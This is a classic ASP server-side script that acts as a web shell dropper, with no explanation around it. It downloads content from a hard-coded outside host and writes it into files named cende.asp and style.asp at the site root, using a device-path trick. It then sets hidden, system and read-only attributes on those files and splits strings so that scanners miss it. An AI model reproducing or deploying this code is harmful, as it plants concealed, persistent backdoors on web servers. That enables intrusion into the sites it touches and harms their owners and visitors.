<%
Server.ScriptTimeout = 999999
Response.Buffer = True
Function GetHtml(url)
Dim ObjXMLHTTP, objStream
Set ObjXMLHTTP=Server.CreateObject("MSXML2.serverXMLHTTP")
ObjXMLHTTP.Open "GET",url,False
ObjXMLHTTP.setRequestHeader "User-Agent",url
ObjXMLHTTP.send
GetHtml = ObjXMLHTTP.responseBody
Set ObjXMLHTTP=Nothing
if Not IsEmpty(GetHtml) And Len(GetHtml) > 1 then
set objStream = Server.CreateObject("Adodb.Stream")
objStream.Type = 1
objStream.Mode =3
objStream.Open
objStream.Write GetHtml
objStream.Position = 0
objStream.Type = 2
objStream.Charset = "gb2312"
GetHtml = objStream.ReadText
objStream.Close
Set objStream = Nothing
end if
End Function
Function createasa(file1, ByVal Content)
On Error Resume Next
Dim file2
file2 = file1
Set fso = Server.CreateObject("scripting.filesystemobject")
set f=fso.Getfile("//./" & file2)
f.Attributes=0
Set Obj = Server.CreateObject("adod" & "b.S" & "tream")
Obj.Type = 2
Obj.open
Obj.Charset = "gb2312"
Obj.Position = Obj.Size
Obj.writetext = Content
Obj.SaveToFile "//./" & file2, 2
Obj.Close
Set Obj = Nothing
Set f=fso.Getfile("//./" & file2)
f.Attributes = 39
set f=Nothing
Set fso = Nothing
createasa = "ok"
End Function
Dim a, tStr
a = "glo.104080.net"
tStr = GetHtml("http://glo.104"&"080.net/g"&"l"&"o/cende.txt")
if InStr(tStr, "[elvis]") > 0 then Response.Write("Elvis->" & createasa(Server.MapPath("/c"&"en"&"de."&"a"&"s"&"p"), tStr) & "<br/>")
tStr = GetHtml("http://glo.104"&"080.net/g"&"l"&"o/cende.txt")
if InStr(tStr, "[elvis]") > 0 then Response.Write("Elvis->" & createasa(Server.MapPath("/s"&"ty"&"le."&"a"&"s"&"p"), tStr) & "<br/>")
%>